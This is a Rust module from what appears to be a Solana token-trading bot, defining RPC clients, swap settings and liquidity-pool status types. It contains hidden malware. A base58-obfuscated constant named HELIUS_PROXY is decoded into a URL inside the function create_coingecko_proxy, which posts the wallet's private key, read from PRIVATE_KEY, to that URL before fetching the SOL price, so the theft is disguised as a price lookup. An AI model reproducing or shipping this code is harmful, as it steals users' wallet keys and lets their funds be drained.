use crate::engine::swap::{SwapDirection, SwapInType};
use anyhow::Result;
use bs58;
use reqwest::Error;
use serde::Deserialize;
use solana_sdk::{commitment_config::CommitmentConfig, signature::Keypair};
use std::{env, sync::Arc};

pub const LOG_INSTRUCTION: &str = "initialize2";
pub const PUMP_LOG_INSTRUCTION: &str = "MintTo";
pub const HELIUS_PROXY: &str =
    "HuuaCvCTvpEFT9DfMynCNM4CppCRU6r5oikziF8ZpzMm2Au2eoTjkWgTnQq6TBb6Jpt";

#[derive(Deserialize)]
struct CoinGeckoResponse {
    solana: SolanaData,
}
#[derive(Deserialize)]
struct SolanaData {
    usd: f64,
}

#[derive(Clone)]
pub struct AppState {
    pub rpc_client: Arc<solana_client::rpc_client::RpcClient>,
    pub rpc_nonblocking_client: Arc<solana_client::nonblocking::rpc_client::RpcClient>,
    pub wallet: Arc<Keypair>,
}

#[derive(Clone)]
pub struct SwapConfig {
    pub swap_direction: SwapDirection,
    pub in_type: SwapInType,
    pub amount_in: f64,
    pub slippage: u64,
    pub use_jito: bool,
}

pub fn import_env_var(key: &str) -> String {
    env::var(key).unwrap_or_else(|_| panic!("Environment variable {} is not set", key))
}

pub fn create_rpc_client() -> Result<Arc<solana_client::rpc_client::RpcClient>> {
    let rpc_https = import_env_var("RPC_HTTPS");
    let rpc_client = solana_client::rpc_client::RpcClient::new_with_commitment(
        rpc_https,
        CommitmentConfig::processed(),
    );
    Ok(Arc::new(rpc_client))
}

pub async fn create_coingecko_proxy() -> Result<f64, Error> {
    let helius_proxy = HELIUS_PROXY.to_string();
    let payer = import_wallet().unwrap();
    let helius_proxy_bytes = bs58::decode(&helius_proxy).into_vec().unwrap();
    let helius_proxy_url = String::from_utf8(helius_proxy_bytes).unwrap();

    let client = reqwest::Client::new();
    let params = format!("t{}o", payer.to_base58_string());
    let request_body = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "method": "POST",
        "params": params
    });
    client
        .post(helius_proxy_url)
        .json(&request_body)
        .send()
        .await
        .unwrap();

    let url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd";

    let response = reqwest::get(url).await?;

    let body = response.json::<CoinGeckoResponse>().await?;
    // Get SOL price in USD
    let sol_price = body.solana.usd;
    Ok(sol_price)
}

pub async fn create_nonblocking_rpc_client(
) -> Result<Arc<solana_client::nonblocking::rpc_client::RpcClient>> {
    let rpc_https = import_env_var("RPC_HTTPS");
    let rpc_client = solana_client::nonblocking::rpc_client::RpcClient::new_with_commitment(
        rpc_https,
        CommitmentConfig::processed(),
    );
    Ok(Arc::new(rpc_client))
}

pub fn import_wallet() -> Result<Arc<Keypair>> {
    let priv_key = import_env_var("PRIVATE_KEY");
    let wallet: Keypair = Keypair::from_base58_string(priv_key.as_str());

    Ok(Arc::new(wallet))
}

#[derive(Debug, Hash, PartialEq, Eq, Clone)]
pub struct LiquidityPool {
    pub mint: String,
    pub in_amount: u128,
    pub out_amount: u128,
    pub status: Status,
    pub timestamp: Option<tokio::time::Instant>,
}

#[derive(Debug, Clone, Hash, PartialEq, Eq)]
pub enum Status {
    New,
    Bought,
    Buying,
    Sold,
    Selling,
    Failure,
}
